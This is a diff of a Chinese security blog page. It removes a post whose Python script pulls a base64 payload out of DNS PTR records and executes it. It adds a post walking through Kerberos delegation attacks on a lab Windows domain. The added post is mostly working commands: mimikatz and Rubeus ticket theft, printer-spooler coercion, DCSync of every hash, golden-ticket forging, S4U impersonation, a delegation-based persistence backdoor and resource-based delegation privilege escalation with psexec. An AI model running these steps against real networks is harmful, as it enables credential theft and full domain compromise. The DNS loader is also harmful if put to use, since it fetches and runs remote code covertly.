@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>PYTHON通过DNS协议传输后门 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="PYTHON通过DNS协议传输后门 | 九世的博客">
+  <title>kerberos委派利用 | 九世的博客</title>
+  <meta name="keywords" content=" 域渗透 ">
+  <meta name="description" content="kerberos委派利用 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1415,9 +1415,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-PYTHON通过DNS协议传输后门" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-kerberos委派利用" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">PYTHON通过DNS协议传输后门</h1>
+        <h1 class="article-title">kerberos委派利用</h1>
     
     <div class="article-meta">
         
@@ -1426,14 +1426,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color4">域渗透</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-10-13 18:02</time>
+        创建时间:<time class="date" title="更新时间: 2020-06-23 00:12:29">2020-06-22 20:26</time>
         
     </div>
     <div class="article-meta">
@@ -1455,7 +1455,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#准备过程"><span class="toc-text">准备过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无约束委派"><span class="toc-text">无约束委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#约束委派"><span class="toc-text">约束委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#资源委派"><span class="toc-text">资源委派</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1470,52 +1470,234 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先吐槽一下，，做了一天护网杯的题发现一题也做不了。我擦。。。心情mmp，然后这个实验是在上学的时候在FB看到的。这里的我也实验了一遍就当做个记录<br><img src="https://s1.ax1x.com/2018/10/13/iNoicj.jpg" alt=""></p>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>先放出FB看的那篇文章吧</p>
-<pre><code>转自Freebuf
-</code></pre><p>DNS后门与检测：<code>http://www.freebuf.com/articles/network/185324.html</code></p>
-<p><strong>思路</strong></p>
-<pre><code>这篇文章的主要思路是通过DNS的PTR记录存放payload然后，用python获取数据进行拼接payload。
-</code></pre><p>实现过程：</p>
-<pre><code>需要环境：Windows server 2008 和 Kali
-1.首先用windows server 2008搭建好DNS服务
-</code></pre><p><img src="https://s1.ax1x.com/2018/10/13/iNoobq.png" alt=""></p>
-<pre><code>2.创建数个PTR记录，放入payload,我这里将其进unicode编码
-</code></pre><p><img src="https://s1.ax1x.com/2018/10/13/iNob5T.md.png" alt=""></p>
-<pre><code>3.写代获取payload并进行拼接，然后执行
+        <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>最近看了不少委派利用的方式，也试着复现了不少。总结一下，常见的委派如下</p>
+<ul>
+<li>无约束委派</li>
+<li>约束委派</li>
+<li>资源委派</li>
+</ul>
+<p>使用委派前提：<br>用户是个服务账户，使用setspn注册用户服务<br>setspn格式：</p>
+<pre><code>&lt;serviceclass&gt;/&lt;host&gt;:&lt;port&gt;/&lt;service name&gt;
+&lt;service class&gt;：标识服务类的字符串
+&lt;host&gt;：服务所在主机名称
+&lt;port&gt;：服务端口
+&lt;service name&gt;：服务名称
 
-import os
-import re
-def zx():
-    xj=open(&#39;zc.txt&#39;,&#39;w&#39;)
-    xj.close()
+Example：
+setspn -D Server/WIN-SLMQA1H7SLH.DOMAIN.local:445 user01
 
-    gl=[]
-    payload=[]
-    for r in range(101,176):
-        qq=os.popen(&#39;nslookup -qtr=ptr 192.168.89.{}&#39;.format(r)) #使用nslookup获得这段IP的ptr记录
-        zz=re.findall(&#39;name = .*&#39;,qq.read()) #正则进行过滤
-        for k in zz:
-            sc=str(k).replace(&quot;name = &quot;,&#39;&#39;)
-            gl.append(sc)
+Ps:服务一定是computer存在的，不然是无效的，之前傻逼试了半天。发现没有成功，是服务不存在的原因-&gt;约束委派
 
-    for z in gl:
-        dw=re.findall(&#39;[u][0-9-a-z][0-9-a-z][0-9-a-z][0-9-a-z]&#39;,str(z))
-        for w in dw:
-            dwe=&#39;\\&#39;+w #在DNS中是没有斜杆的得自己手动加上
-            print(dwe,end=&#39;&#39;,file=open(&#39;zc.txt&#39;,&#39;a&#39;))
+Examples：
+MSSQLMSSQLSvc/adsmsSQLAP01.adsecurity.org:1433
+Exchange
+exchangeMDB/adsmsEXCAS01.adsecurity.org
+RDP
+TERMSERV/adsmsEXCAS01.adsecurity.org
+WSMan / WinRM / PS Remoting
+WSMAN/adsmsEXCAS01.adsecurity.org
+Hyper-V Host
+Microsoft Virtual Console Service/adsmsHV01.adsecurity.org
+VMWare VCenter
+STS/adsmsVC01.adsecurity.org
+</code></pre><p>可以委派的东西：</p>
+<ul>
+<li>user</li>
+<li>computer</li>
+</ul>
+<p>委派里的术语：</p>
+<pre><code>* 不信任此用户作为委派：不允许此用户委派
+* 信任此用户作为任何服务的委派：非约束委派
+* 仅信任此用户作为指定服务的委派
+    * 仅使用Kerberos（只将用户作为kerberos服务委派）
+    * 指定服务类型委派
+</code></pre><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>computername:WIN-SLMQA1H7SLB.DOMAIN.local ip:192.168.1.201 域内主机<br>computername:WIN-SJDK9J352PJ.DOMAIN.local ip:192.168.1.109 域控</p>
+<h2 id="准备过程"><a href="#准备过程" class="headerlink" title="准备过程"></a>准备过程</h2><p>无约束委派用户user01 (这样和约束委派没啥区别的感觉…当然可能我的理解有误)</p>
+<pre><code>setspn -A Server/WIN-SLMQA1H7SLH.DOMAIN.local:445 user01
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYEQKS.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NYE8Ej.png" alt=""></p>
+<p><strong>同一个服务重新注册服务的时候，记得把用户取消注册服务</strong></p>
+<pre><code>setspn -D &lt;service&gt;/&lt;host&gt; &lt;username&gt;
+Example:setspn -D Server/WIN-SLMQA1H7SLH.DOMAIN.local:445 user01
+</code></pre><p>无约束委派主机WIN-SLMQA1H7SLB<br><img src="https://s1.ax1x.com/2020/06/22/NYEU2V.md.png" alt=""></p>
+<p>约束委派用户</p>
+<pre><code>setspn -U -A Server/WIN-SJDK9J352PJ.DOMAIN.local:445 user01
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYm8yV.png" alt=""></p>
+<h2 id="无约束委派"><a href="#无约束委派" class="headerlink" title="无约束委派"></a>无约束委派</h2><p>利用前提:得到被委派主机的权限<br>利用的方法:</p>
+<ul>
+<li>被动搜刮机子里的票据，看看有没有高权的票据</li>
+<li>非约束委派+Spooler打印机服务 制作黄金票据</li>
+<li>中继攻击 (没测试)</li>
+</ul>
+<p><strong> 被动利用 </strong><br>假设DC访问配置了SPN的域内主机<br><img src="https://s1.ax1x.com/2020/06/22/NYVxl6.png" alt=""></p>
+<p>域内主机使用mimikatz导出票据</p>
+<pre><code>mimikatz command:
+privilege::debug
+sekulrsa::tickets /export
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYZAfI.png" alt=""></p>
+<p>但是不是krbtgt，非kerberos协议无法利用</p>
+<p><strong>主动利用</strong><br>开启Rubeus监听域控传来的密钥</p>
+<pre><code>格式:Rubeus.exe monitor /interval:1 /filteruser:&lt;域控computername&gt;$ #interval代表1秒监听一次，filteruser表示只监听指定主机的密钥，不设置则监听所有传来的密钥
 
-    dk=open(&#39;zc.txt&#39;,&#39;r&#39;)
-    reads=dk.read()
-    exploit=reads.encode(&#39;utf-8&#39;).decode #编码成字符串 (&#39;unicode_escape&#39;)
-    mls=&quot;&quot;&quot;python -c &quot;exec(&#39;{}&#39;.decode(&#39;base64&#39;)){}&quot;&quot;&quot;.format(exploit,&#39;&quot;&#39;)
-    os.system(mls) #执行
-zx()
-</code></pre><p>测试结果如下：</p>
-<p><img src="https://s1.ax1x.com/2018/10/13/iNT2e1.png" alt=""></p>
-<p><img src="https://s1.ax1x.com/2018/10/13/iNTRdx.png" alt=""></p>
-<p>音乐：<embed src="//music.163.com/style/swf/widget.swf?sid=531925&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"></p>
-<p>转载请声明：转自422926799.github.io</p>
+Rubeus.exe monitor /interval:1 /filteruser:WIN-SJDK9J352PJ$
+</code></pre><p>利用打印服务强制让域控机向域内主机表名身份</p>
+<pre><code>格式:SpoolSample_v4.5_x64..exe &lt;域控computername&gt; &lt;被设置为非约束委派的computername&gt;
+SpoolSample_v4.5_x64..exe WIN-SJDK9J352PJ WIN-SLMQA1H7SLB
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYZWHe.md.png" alt=""></p>
+<p>将得到的base64处理一下(去掉空格换行符那些)，使用powershell转换成TGT</p>
+<pre><code>[IO.File]::WriteAllBytes(&quot;绝对路径\ticket.kribi&quot;, [Convert]::FromBase64String(&quot;得到的base64&quot;) #绝对路径是必须的否则不行
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYZ7gP.png" alt=""></p>
+<p>Ps:我们这儿获得的TGT票据，不能算黄金票据，因为我们获得的权限只是域控的本地管理权限，所以不能连接域控，但是我们确可以因此获取所以用户的hash，所以能制作真正的黄金票据</p>
+<p>dump dcsync</p>
+<pre><code>kerberos::purge
+kerberos::ptt tckest.kribi
+kerberos::list
+lsadump::dcsync /domain DOMAIN.local /all /csv
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYZOHg.md.png" alt=""></p>
+<p>制作金票</p>
+<pre><code>1.域SID (whoami /user去掉权限位就是，最后一个-和后面的内容不要)
+2.Krbtgt的hash
+3.要伪造的用户名
+4.导出的票据名称
+
+kerberos::golden /domain:DOMAIN.local /SID:S-1-5-21-447451162-2905414466-2158217208 /krbtgt:3545206ebb9114742e9de826d0d35de7 /user:administrator /ticket:ntlm.kirbi
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYey5j.png" alt=""></p>
+<p>导入金票利用：</p>
+<pre><code>kerberos::purge
+kerberos::ptt ntlm.kirbi
+exit
+klist #查看当前票据
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYe4qU.md.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/06/22/NYeqR1.md.png" alt=""></p>
+<h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p>利用前提:得到被委派的用户账户或hash或TGT<br>利用的方法:<br>受限委派的情况下，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务。<br>但是如果攻击者可以获取到开启非限制委派的服务账户的明文口令/NTLM Hash，也可以伪造TGT和S4U请求<br>伪装成服务账户以任意账户的权限（如域管理员）申请TGS<br>其中服务账户的明文口令可能可以通过Kerberoasting攻击获取<br>在知道服务账号明文口令的情况下，使用kekeo获取TGT</p>
+<pre><code>kekeo.exe &quot;tgt::ask /user:&lt;username&gt; /domain:&lt;domain&gt; /password:&lt;password&gt;&quot; exit
+</code></pre><p>kekeo也支持直接使用NTLM进行TGT请求</p>
+<pre><code>kekeo.exe &quot;tgt::ask /user:iis_svc /domain:lab.local /NTLM:a87f3a337d73085c45f9416be5787d86&quot; exit
+</code></pre><p>如果攻击者可以直接拿到IIS服务所在服务器的权限，也可以直接从内存中提取服务账户TGT，无需进行tgt::ask，直接tgt::s4u即可</p>
+<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::ticket /export&quot; exit
+</code></pre><p>kekeo通过s4u请求以DOMAIN\test用户身份访问CIFS的TGS<br>S4U2Self获取到的ticket和S4U2Proxy获取到的WIN-SJDK9J352PJ CIFS服务的TGS会以文件保存在当前目录下</p>
+<pre><code>kekeo.exe &quot;tgs::s4u /tgt:TGT_test@DOMAIN.LOCAL_krbtgt~DOMAIN.local@DOMAIN.LOCAL.kirbi /user:Administrator@DOMAIN.local /service:cifs/WIN-SJDK9J352PJ.DOMAIN.local&quot; exit
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYM9nP.png" alt=""><br>mimikatz将获取到的TGS写入当前会话<br><img src="https://s1.ax1x.com/2020/06/22/NYQEVK.png" alt=""><br><img src="https://s1.ax1x.com/2020/06/22/NYQZ5D.png" alt=""></p>
+<p><strong>后门维持</strong></p>
+<ul>
+<li>变种金票(windows server 2012域控没有成功)-&gt;<a href="https://paper.seebug.org/620/" target="_blank" rel="noopener">https://paper.seebug.org/620/</a></li>
+<li>受限委派 + DCSync 维持域权限</li>
+</ul>
+<p>随便注册一个服务</p>
+<pre><code>setspn -U -A backdoor/WIN-SLMQA1H7SLB.DOMAIN.local user01
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYbJJA.png" alt=""><br>使用1powershell设置属性(ldap协议注册)</p>
+<pre><code>$user = Get-ADUser user01 -Properties &quot;msDS-AllowedToDelegateTo&quot;
+Set-ADObject $user -Add @{ &quot;msDS-AllowedToDelegateTo&quot; = @(&quot;ldap/WIN-SJDK9J352PJ.DOMAIN.local&quot;) }
+Set-ADAccountControl $user -TrustedToAuthForDelegation $true
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYqpYd.png" alt=""></p>
+<p>如果想取消用户的msDS-AllowedToDelegateTo，可以用powerview（当然set-aduser应该也行）</p>
+<pre><code>Set-DomainObject user01 -Clear &#39;msDS-AllowedToDelegateTo&#39; -Verbose
+
+用set-aduser:
+Set-ADUser user01 -Clear &#39;msDS-AllowedToDelegateTo&#39;
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYLPN4.png" alt=""></p>
+<p>在把对应的用户勾选不使用用户委派，重新用Ad用户和计算机打开看就没了<br><img src="https://s1.ax1x.com/2020/06/22/NYLQ4H.png" alt=""></p>
+<p>使用user01的凭证申请TGT</p>
+<pre><code>kekeo.exe &quot;tgt::ask /user:user01 /domain:DOMAIN.local /password:Haq1234561&quot; exit
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYLtDf.png" alt=""></p>
+<p>用TGT申请域控的凭证</p>
+<pre><code>kekeo.exe &quot;tgs::s4u /tgt:TGT_user01@DOMAIN.LOCAL_krbtgt~DOMAIN.local@DOMAIN.LOCAL.kirbi /user:haq@DOMAIN.local /service:ldap/WIN-SJDK9J352PJ.DOMAIN.local&quot; exit
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYLdUg.png" alt=""></p>
+<p>mimikatz导入TGT并使用lsadump::dsync导出krbtgt的hash</p>
+<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:DOMAIN.local /ntlm:3545206ebb9114742e9de826d0d35de7 /run:cmd.exe&quot; exit
+
+mimikatz.exe &quot;kerberos::golden /domain:DOMAIN.local /SID:S-1-5-21-447451162-2905414466-2158217208 /krbtgt:3545206ebb9114742e9de826d0d35de7 /user:administrator /ticket:ntlm.kirbi&quot; exit
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/22/NYL4PJ.png" alt=""></p>
+<p>然后造金票，利用方法一样</p>
+<h2 id="资源委派"><a href="#资源委派" class="headerlink" title="资源委派"></a>资源委派</h2><p>需要了解的两个协议</p>
+<ul>
+<li><p>S4U2Self<br>通过此扩展可以拿到一张标识任意用户身份的TGS(图中是去获取的用户X身份的TGS)，上文已经解释过了，它的作用其实是协议转换。当用户X使用非Kerberos协议请求网站A的时候，网站A是没有用户X的TGS的，但是是网站A要去获取文件服务器B的访问权限（TGS）需要用户X的TGS，因此S4U2Self解决了这个问题，网站A服务器可以使用它去向KDC请求一张用户X身份的TGS，网站A服务器再用这张TGS去发起S4U2proxy请求。</p>
+</li>
+<li><p>S4U2proxy<br>该拓展作用是使用一张用户X身份的TGS去向KDC请求一张用于访问文件服务器B的TGS，这张TGS的身份还是用户X，这样网站A就可以利用用户X的权限去访问文件服务器B上的文件了。</p>
+</li>
+</ul>
+<p>用户要求-&gt;SPN用户(非SPN用户无法s4u申请域管票据)<br>资源委派-&gt;利用用户的ACL进行利用<br>主要注意的五个ACL权限-&gt;GenericAll、GenericWrite、WriteProperty、WriteDacl</p>
+<p>微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）这篇文章提到的便是利用WriteProperty ACL从用域用户加入的时候就已经存在，所以可以利用这个ACL给自己添加一个机器账户(同时也是SPN)，然后给目标机器设置msDS-AllowedToActOnBehalfOfOtherIdentity msDS-AllowedToActOnBehalfOfOtherIdentity属性，然后在申请高权TGS导入。</p>
+<p>过程：<br>.通过LDAP添加机器账户<br>2.并获取新建用户的SID<br>3.对指定目标机添加msDS-AllowedToActOnBehalfOfOtherIdentity，value为D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&lt;新建用户的SID&gt;)<br>4.获取新账户的TGT<br>5.利用得到的TGT去申请高权(域管)的票据</p>
+<p>msDS-AllowedToActOnBehalfOfOtherIdentity msDS-AllowedToActOnBehalfOfOtherIdentity<br>在上一篇文章《这是一篇“不一样”的真实渗透测试案例分析文章》中介绍过了。此属性作用是控制哪些用户可以模拟成域内任意用户然后向该计算机进行身份验证。简而言之， 如果我们可以修改该属性那么我们就能拿到一张域管理员的票据，但该票据只对这台机器生效，然后拿这张票据去对计算机进行认证。也就是说当域内存在任意一台域控和域功能级别是server 2012及以上时，可以通过给所在机器配置”msDS-AllowedToActOnBehalfOfOtherIdentity”属性来设置rbcd，然后通过s4u协议申请高权限票据进行利用。</p>
+<p>利用SharpAllowedToAct可以成功给目标机子加上对应的msDS-AllowedToActOnBehalfOfOtherIdentity属性，但是setspn与文章不符，没法继续下去。emmm<br><img src="https://s1.ax1x.com/2020/06/23/NYOeRs.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/06/23/NYOKs0.png" alt=""></p>
+<p>文章里成功添加用户并给目标机器添加了msDS-AllowedToActOnBehalfOfOtherIdentity属性后的SPN<br><img src="https://s1.ax1x.com/2020/06/23/NYOMLV.md.png" alt=""><br>(n0thing-pc为目标机器名)</p>
+<p>自己测试过程<br><img src="https://s1.ax1x.com/2020/06/23/NYOlZT.png" alt=""></p>
+<p>那么就直接总结一下算了….</p>
+<p>寻找某个用户可操控的机子：</p>
+<ul>
+<li>利用powerView</li>
+<li>利用C#</li>
+</ul>
+<p>powerview</p>
+<pre><code>Get-DomainUser -Identity &lt;user&gt; -Properties objectsid #获取某个用户的SID
+Get-DomainObjectAcl -Identity &lt;computername&gt;  | ?{$_.SecurityIdentifier -match &quot;&lt;userid&gt;&quot;} #查询某个机子的权限
+</code></pre><p><img src="https://s1.ax1x.com/2020/06/23/NYOdL6.png" alt=""></p>
+<p>C#</p>
+<pre><code class="C#">
+using System;
+using System.Security.Principal;
+using System.DirectoryServices;
+namespace ConsoleApp9
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            DirectoryEntry ldap_conn = new DirectoryEntry(&quot;LDAP://dc=redteam,dc=com&quot;);
+            DirectorySearcher search = new DirectorySearcher(ldap_conn);
+            String query = &quot;(&amp;(objectClass=computer))&quot;;//查找计算机
+            search.Filter = query;
+            foreach (SearchResult r in search.FindAll())
+            {
+                String mS_DS_CreatorSID=&quot;&quot;;
+                String computername = &quot;&quot;;
+                try
+                {
+                    computername = r.Properties[&quot;dNSHostName&quot;][0].ToString();
+                    mS_DS_CreatorSID = (new SecurityIdentifier((byte[])r.Properties[&quot;mS-DS-CreatorSID&quot;][0], 0)).ToString();
+                    //Console.WriteLine(&quot;{0} {1}\n&quot;, computername, mS_DS_CreatorSID);
+                }
+                catch
+                {
+                    ;
+                }
+                //再通过sid找用户名
+                String UserQuery = &quot;(&amp;(objectClass=user))&quot;;
+                DirectorySearcher search2 = new DirectorySearcher(ldap_conn);
+                search2.Filter = UserQuery;
+                foreach (SearchResult u in search2.FindAll())
+                {
+                    String user_sid = (new SecurityIdentifier((byte[])u.Properties[&quot;objectSid&quot;][0], 0)).ToString();
+                    if (user_sid == mS_DS_CreatorSID) {
+                        //Console.WriteLine(&quot;debug&quot;);
+                        String username = u.Properties[&quot;name&quot;][0].ToString();
+                        Console.WriteLine(&quot;[*] [{0}] -&gt; creator  [{1}]&quot;,computername, username);
+                    }
+                }
+            }
+        }
+    }
+}
+</code></pre>
+<p><img src="https://s1.ax1x.com/2020/06/23/NYORyt.png" alt=""></p>
+<p>利用SharpAllowedToAct-master实现用户添加<br>仓库地址：<a href="https://github.com/pkb1s/SharpAllowedToAct" target="_blank" rel="noopener">https://github.com/pkb1s/SharpAllowedToAct</a></p>
+<p><img src="https://s1.ax1x.com/2020/06/23/NYOoFg.png" alt=""></p>
+<p>利用有两种方法</p>
+<ul>
+<li>Rubeus+Psexec</li>
+<li>impacket工具包-&gt;getST.py+smbexec.py</li>
+</ul>
+<p>Rubeus+Psexec利用过程:</p>
+<pre><code>Rubeus.exe hash /user:evilsystem /password:evil /domain:test.local #转换成hash得到RC4
+Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt #申请票据导入
+Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:host/dm2008 /ptt #申请host票据，如果不申请host票据psexec无法返回shell
+psexec \\&lt;computername&gt; -s cmd
+
+Ps:用Rubeus你就得申请两个服务票据：HOST和CIFS，如果是用impacket套件的话就申请个CIFS就可以了。
+</code></pre><p>impacket提权如下<br>来自微信公众号文章《微软不认的提权漏洞——“烂番茄”》里的视频截图<br><img src="https://s1.ax1x.com/2020/06/23/NYOOO0.png" alt=""></p>
+<p>Ps：在域内，服务权限那些，也可以利用这种方法提权。以为服务出网的时候用的账户的权限<br><img src="https://s1.ax1x.com/2020/06/23/NYXpY4.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1525,12 +1707,12 @@ zx()
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>PYTHON通过DNS协议传输后门</p>
+    <p><span class="copy-title">文章标题:</span>kerberos委派利用</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-10-13, 18:02:13</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/2726caf0.html" title="PYTHON通过DNS协议传输后门">http://422926799.github.io/posts/2726caf0.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-06-22, 20:26:23</p>
+    <p><span class="copy-title">最后更新:</span>2020-06-23, 00:12:29</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/216ead38.html" title="kerberos委派利用">http://422926799.github.io/posts/216ead38.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
